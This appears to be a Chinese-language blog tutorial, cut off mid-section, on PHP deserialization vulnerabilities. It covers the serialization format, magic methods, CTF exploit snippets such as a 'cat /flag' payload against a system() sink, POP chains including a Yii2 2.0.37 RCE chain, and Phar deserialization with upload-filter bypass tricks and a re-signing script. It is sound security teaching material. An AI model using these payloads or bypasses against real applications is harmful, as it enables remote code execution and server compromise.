<p>但是如果程序未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，通过在参数中注入一些代码，从而达到代码执行、SQL 注入、目录遍历等不可控后果，危害较大。</p>
<p>反序列化漏洞造成的危害主要取决于类与对象可以实现的操作，本质上反序列化漏洞是由于反序列化位点过滤不严，导致攻击者可以控制特定对象实现其特定功能的一类操作过程。</p>
<p>如下代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p><code>evil</code>类中的析构函数<code>__destruct</code>存在RCE利用点，而<code>unserialize</code>反序列化位点没有进行合理的检测，导致可以控制反序列化过程，攻击者可以调用<code>evil</code>类，从而触发类中的RCE操作。</p>
<p>Exp如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> evil);</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311200323147.png"
                      alt="image-20230311200323147"
                ></p>
<h2 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h2><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>定义：利用 <code>serialize() </code>函数将一个对象转换为字符串形式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311200410794.png"
                      alt="image-20230311200410794"
                ></p>
<p><code>O</code>表示Object，即为序列化数据为一个对象；</p>
<p><code>6</code>代表类名长度，类名people共有六个字符串；</p>
<p><code>“people”</code>表示了类名；</p>
<p><code>2</code>代表成员数目，共有name、age两个成员；</p>
<p><code>s</code>表示String，即为字符串；</p>
<p><code>4</code>代表属性名长度；</p>
<p><code>“name”</code>表示成员名称；</p>
<p><code>s:4:“Jack”;</code>表示了成员内容（值）；</p>
<p><code>s:3:“age”;</code>表示了一个名为age的成员；</p>
<p><code>i:20;</code>表示该成员值为整型20；</p>
<p>如果成员属性非public，反序列化之后的数据是有所改变的：</p>
<p>如下代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Jack</span> = <span class="keyword">new</span> people;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$Jack</span>);</span><br></pre></td></tr></table></figure></div>

<p>注意这里的<code>name</code>成员被修饰为<code>private</code>，而<code>age</code>成员则被修饰为了<code>protected</code>属性</p>
<p>执行这段代码我们可以得到：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311200940865.png"
                      alt="image-20230311200940865"
                ></p>
<p>注意：<code>private</code>属性的成员名发生了改变 ，但是我们看到的<code>peoplename</code>的长度并不等于12。</p>
<p><code>protected</code>属性的成员名也发生了改变，但是<code>*age</code>的长度也不等于6。</p>
<p>如果我们对反序列化之后的数据进行一次URL编码就能找到原因，将上文的代码第7行修改为：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$Jack</span>));</span><br></pre></td></tr></table></figure></div>

<p>这样我们就可以得到如下的结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201127579.png"
                      alt="image-20230311201127579"
                ></p>
<p><code>protected</code>属性的成员在序列化后URL编码多出了<strong>两个空字节</strong>与<strong>一个星号</strong></p>
<p>结构为：<code>%00*%00成员名</code></p>
<p>长度为：<code>1+1+1+3 = 6</code></p>
<p><strong>空字节占用一个长度，在不进行URL编码的情况下空字节是不可见的</strong></p>
<p><code>private</code>属性的成员序列化后在URL编码后可以看到多出了<strong>两个空字节</strong>，</p>
<p>结构为：<code>%00类名%00成员名</code></p>
<p>长度为：<code>1+6+1+4 = 12</code></p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>定义：利用 <code>unserialize()</code>函数将一个序列化字符串还原为对象形式。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201318735.png"
                      alt="image-20230311201318735"
                ></p>
<p>执行上方的代码我们就可以还原出people类的对象：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201458448.png"
                      alt="image-20230311201458448"
                ></p>
<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>PHP中把以两个下划线<code>__</code>开头的方法称为*魔术方法(Magic methods)*，这些方法<strong>在满足一定条件之后可以自动触发调用，而不需要人为调用</strong>，因此被称为魔术方法。</p>
<p>常见的魔术方法如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()	构造函数，在类被实例化为对象时自动调用</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()    析构函数，在类的对象结束生命周期后调用</span><br><span class="line"><span class="title function_ invoke__">__call</span>()     	在对象中调用一个不可访问方法时调用</span><br><span class="line"><span class="title function_ invoke__">__get</span>()     	获得一个类的成员变量时调用</span><br><span class="line"><span class="title function_ invoke__">__set</span>()     	设置一个类的成员变量时调用</span><br><span class="line"><span class="title function_ invoke__">__isset</span>()     	当对不可访问属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时调用</span><br><span class="line"><span class="title function_ invoke__">__unset</span>()     	当对不可访问属性调用<span class="keyword">unset</span>()时被调用。</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()     	执行<span class="title function_ invoke__">serialize</span>()时，先会调用这个函数</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()    	执行<span class="title function_ invoke__">unserialize</span>()时，先会调用这个函数</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()    类被当成字符串时的回应方法</span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()     	调用函数的方式调用一个对象时的回应方法</span><br></pre></td></tr></table></figure></div>



<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="简单的反序列化"><a href="#简单的反序列化" class="headerlink" title="简单的反序列化"></a>简单的反序列化</h3><h4 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h4><p>简单的反序列化题目主要考察选手对于类与对象及反序列化的基础知识应用，通常难度为入门至简单。    如下的代码，直接给了一个evil类，其中的析构函数__destruct中含有一个RCE点，而析构函数会在一个对象生命周期结束时自动调用，因此只需要反序列化evil这个类，把其中的cmd成员值修改为我们要执行的命令即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201731181.png"
                      alt="image-20230311201731181"
                ></p>
<p>Exp如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> evil);</span><br></pre></td></tr></table></figure></div>

<p>得到<code>O:4:&quot;evil&quot;:1:&#123;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125; </code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201818576.png"
                      alt="image-20230311201818576"
                ></p>
<h4 id="Challenge2"><a href="#Challenge2" class="headerlink" title="Challenge2"></a>Challenge2</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311201848702.png"
                      alt="image-20230311201848702"
                ></p>
<p>不同于上一道题目，这个题目并没有自动调用的魔术方法，但是可以关注第七行代码的 <code>unserialize($_GET[&#39;data&#39;])();</code></p>
<p>这里是以函数的形式去调用了反序列化之后的<code>data</code>数据，而这里涉及到的知识点就是<strong>方法的静态调用</strong>。   </p>
<p>在PHP中我们可以通过 <code>类名::方法名</code> 的形式去静态调用类中的方法，换而言之就是<strong>我们可以在不创建类的对象的情况下去直接调用类的方法</strong>，在Java语言中我们需要给静态方法加上<code>static</code>关键词来修饰。</p>
<p>Exp如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="string">&quot;evil::getflag&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>得到<code>s:13:&quot;evil::getflag&quot;;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202003414.png"
                      alt="image-20230311202003414"
                ></p>
<h3 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p><em>如果看到这里你已经忘记了之前提到的常见魔术方法，请翻回去重温一遍！</em></p>
<h4 id="Challenge3"><a href="#Challenge3" class="headerlink" title="Challenge3"></a>Challenge3</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202108242.png"
                      alt="image-20230311202108242"
                ></p>
<p>在我们构造POP链时，通常以<code> __destruct</code> 或<code> __wakeup</code> 当作入口方法。</p>
<p>本题中，我们将A类的<code>__destruct</code>方法当作入口点，A类的<code>__destruct</code>方法会输出<code>$this-&gt;str</code></p>
<p>如果我们将<code>$this-&gt;str</code>设置为B类的一个对象，那么就会<strong>将B类的对象当作字符串输出</strong>，此时就满足了<code>__toString</code>方法的调用情景，进而触发到B类的<code>__toString方法</code>。</p>
<p>B类的<code>__toString</code>方法又会<strong>以函数的形式调用</strong><code>$this-&gt;obj</code>的值，因此只需要将B类的<code>$this-&gt;obj</code>设置为A类的对象就会去触发A类的<code>__invoke</code>方法，从而获得flag。</p>
<p>POP链：</p>
<pre class="mermaid">graph TD;
    A::__destruct-->B::__toString;
    B::__toString-->A::__invoke;</pre>

<p>在明晰了POP链构造思路后，我们可以写出Exp：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="string">&quot;1&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br></pre></td></tr></table></figure></div>

<p>将序列化数据以GET方式传递给pop参数即可获得Flag。</p>
<h3 id="框架中的POP链"><a href="#框架中的POP链" class="headerlink" title="框架中的POP链"></a>框架中的POP链</h3><h4 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h4><p>本质上框架中的POP链也还是构造POP，从<code>__destruct</code>或者是<code>__wakeup</code>开始，不断在整个框架中寻找可以调用到的同名方法或者是魔术方法当作跳板，最终触发到某个不安全的方法中，只是相比于一般的CTF赛题代码审计量大了很多，但是耐心挖掘一下还是可以找到不少的。</p>
<p>但是框架中的POP链条严格意义上并不算是漏洞，任何POP链条的利用都需要依赖于反序列化位点的存在，如果没有可以利用的反序列化位点，那么POP链条也只是一条链子（当然也有部分开发者会认为POP链属于安全漏洞，甚至还可以给CNVD或者CVE证书的）</p>
<p>知名安全工具<code>phpggc</code>中集成了大量框架的POP链条，项目地址如下：<a class="link"   href="https://github.com/ambionics/phpggc" >https://github.com/ambionics/phpggc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311232256313.png"
                      alt="image-20230311232256313"
                ></p>
<h4 id="Challenge4"><a href="#Challenge4" class="headerlink" title="Challenge4"></a>Challenge4</h4><p>我们来看一下Yii2框架中的一条RCE POP链，从Yii官网下载一个<strong>Yii2.0.37</strong>版本的框架部署一下，然后创建<code>controllers/TestController.php</code>文件。写入如下内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202515015.png"
                      alt="image-20230311202515015"
                ></p>
<p>然后去调用控制器：<a class="link"   href="http://localhost/index.php?r=test/test" >http://localhost/index.php?r=test/test<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 即可触发反序列化位点。</p>
<p>这里的POP链条挖掘还是从<code>__destruct</code>析构函数入手，全局搜索后选择<code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code>中的 <code>BatchQueryResult</code>类的析构函数入手：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202610016.png"
                      alt="image-20230311202610016"
                ></p>
<p>跟进本类的<code>reset</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202618158.png"
                      alt="image-20230311202618158"
                ></p>
<p><code>$this-&gt;_dataReader</code>成员完全可控，因此直接去全局寻找<code>close</code>方法,在<code>vendor/guzzlehttp/psr7/src/FnStream.php</code>文件中发现了一个<strong>可以调用函数执行</strong>的<code>close</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202642081.png"
                      alt="image-20230311202642081"
                ></p>
<p><code>$this-&gt;_fn_close</code>完全可控，实现任意函数调用，到这里已经可以执行<code>phpinfo</code>了，不过我们继续来把危害扩大。利用这里的<code>call_user_func</code>，我们直接去寻找含有危险函数的方法，例如<code>eval</code>等。</p>
<p>在<code>vendor/phpunit/phpunit/src/Framework/MockObject/MockTrait.php</code>文件中我们可以找到一个公有的<code>generate</code>方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202744514.png"
                      alt="image-20230311202744514"
                ></p>
<p>简单分析之后发现<code>$this-&gt;mockName</code>与<code>$this-&gt;classCode</code>均完全可控，可以实现RCE。</p>
<p>最终POP调用链如下：</p>
<pre class="mermaid">graph TD;
    BatchQueryResult::__destruct-->BatchQueryResult::set;
    BatchQueryResult::set-->Stream::close;
    Stream::close-->MockTrait::generate;</pre>

<p>Exp如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202837978.png"
                      alt="image-20230311202837978"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311202843526.png"
                      alt="image-20230311202843526"
                ></p>
<h3 id="Phar反序列化"><a href="#Phar反序列化" class="headerlink" title="Phar反序列化"></a>Phar反序列化</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>phar文件解析存储的<code>meta-data</code>信息以序列化方式存储，当<strong>文件操作函数</strong>通过<strong>phar伪协议解析</strong>的文件时就会将数据反序列化。</p>
<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>文件上传点（用于上传Phar文件）</li>
<li>可用的POP链</li>
<li>可控的文件操作函数（触发phar反序列化），具体影响函数如下表：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203015857.png"
                      alt="image-20230311203015857"
                ></li>
</ul>
<h4 id="实际意义"><a href="#实际意义" class="headerlink" title="实际意义"></a>实际意义</h4><p>Phar反序列化拓展了PHP中反序列化的攻击面，反序列化漏洞不再局限在<code>unserialize</code>函数中，而是可以通过文件上传与文件操作函数相结合而触发反序列化。</p>
<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>下面我们来构建一个Demo去生成一个phar包文件，在生成phar文件前，我们需要修改php.ini的一个配置：</p>
<p><code>;phar.readonly=On</code>  修改为 <code>phar.readonly=Off</code></p>
<p>修改完毕后重启Web服务使配置生效，然后准备如下的PHP代码：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span> = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&quot;a.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&quot;__HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetaData</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>访问php文件后可以看到同目录下已经生成了phar文件，我们来分析一下Phar包的结构：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203443764.png"
                      alt="image-20230311203443764"
                ></p>
<ul>
<li><p>stub 		 一个供phar扩展用于识别的标志，必须以<code>__HALT_COMPILER();?&gt;</code>来结尾。</p>
</li>
<li><p>manifest  这部分会以序列化的形式存储用户自定义的meta-data，即为反序列化漏洞点。</p>
</li>
<li><p>contents  被压缩文件的内容。</p>
</li>
<li><p>signature  签名，放在文件末尾。</p>
</li>
</ul>
<p>在分析phar的文件结构时可能会注意到，<strong>php识别phar文件是通过其文件头的stub</strong>，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。</p>
<p>那么我们就<strong>可以通过添加任意的文件头+修改后缀名</strong>的方式<strong>将phar文件伪装成其他格式的文件</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203616389.png"
                      alt="image-20230311203616389"
                ></p>
<p>像是这样，我们可以在Phar包的stub头部分添加GIF文件头，需要注意的是生成时文件拓展名必须为phar。</p>
<p>在生成了Phar文件后，我们将其拓展名修改为gif，此时phar文件就被我们伪装成了gif文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203630743.png"
                      alt="image-20230311203630743"
                ></p>
<p>下面我们来尝试触发一下phar反序列化。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203642331.png"
                      alt="image-20230311203642331"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203645872.png"
                      alt="image-20230311203645872"
                ></p>
<p>也就是说，其实<strong>文件的拓展名不会影响phar反序列化的执行</strong>，因此在面对有白名单的上传点时，只要情景满足触发phar反序列化的条件，我们就可以去尝试Phar反序列化。</p>
<h4 id="一些ByPass技巧"><a href="#一些ByPass技巧" class="headerlink" title="一些ByPass技巧"></a>一些ByPass技巧</h4><p>下面我们来看看限制情况下的Phar反序列化。</p>
<ul>
<li>如果服务器对上传文件的内容有过滤，例如：<code>preg_match(&quot;/php/i&quot;,$contents)</code>。上文中我们提到过php识别phar文件是通过<code>__HALT_COMPILER();?&gt;</code>这段代码来触发的，因而设置stub头时去掉<code>&lt;?php</code>即可</li>
<li>如果依旧是对内容有过滤，但是此时为：<code>preg_match(&quot;/HALT_COMPILER/i&quot;,$contents)</code>。此时我们需要提到一个Trick，<strong>就是phar文件在进行gzip之类的压缩后仍然可以正常触发反序列化</strong>。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203840399.png"
                      alt="image-20230311203840399"
                ></p>
<p>如上是正常情况下生成的Phar包文件，如果我们对其进行<code>gzip</code>压缩，那么他会变成：<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203846899.png"
                      alt="image-20230311203846899"
                ></p>
<p>这样就绕过了内容的检测，但是其依旧可以正常触发Phar反序列化：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203901699.png"
                      alt="image-20230311203901699"
                ></p>
<ul>
<li>对上传文件大小有最低限制，例如限制文件大小必须大于2M，我们可以在Phar包压缩的文件中，填充垃圾数据：</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20230311203922129.png"
                      alt="image-20230311203922129"
                ></p>
<h4 id="Phar重签名"><a href="#Phar重签名" class="headerlink" title="Phar重签名"></a>Phar重签名</h4><p>如果我们需要对Phar包中的序列化数据进行修改，例如绕过<code>__wakeup</code>或者是FastDestuct，我们需要借助<strong>十六进制编辑器</strong>先对Phar包中的序列化数据进行修改（Phar包是一个二进制文件，如果直接修改可能会无意删掉一些不可见字符），修改完成序列化数据后需要使用以下脚本对Phar文件进行重签名，否则PHP会认为这是一个无效的Phar包，从而导致无法触发Phar反序列化，Phar签名的原理也非常简单，直接看代码即可：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;new.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure></div>



<h3 id="Fast-Destruct"><a href="#Fast-Destruct" class="headerlink" title="Fast Destruct"></a>Fast Destruct</h3><p><code>__destruct()</code>在对象生命周期结束后都会被触发，但是前提是必须得完成程序的开始与结束，但是如果程序执行了一半，突然报错退出，那么<code>__destruct()</code>此时不会触发了，这个时候就需要用到Fast Destruct的方法。</p>
<h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><ol>
<li>如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</li>
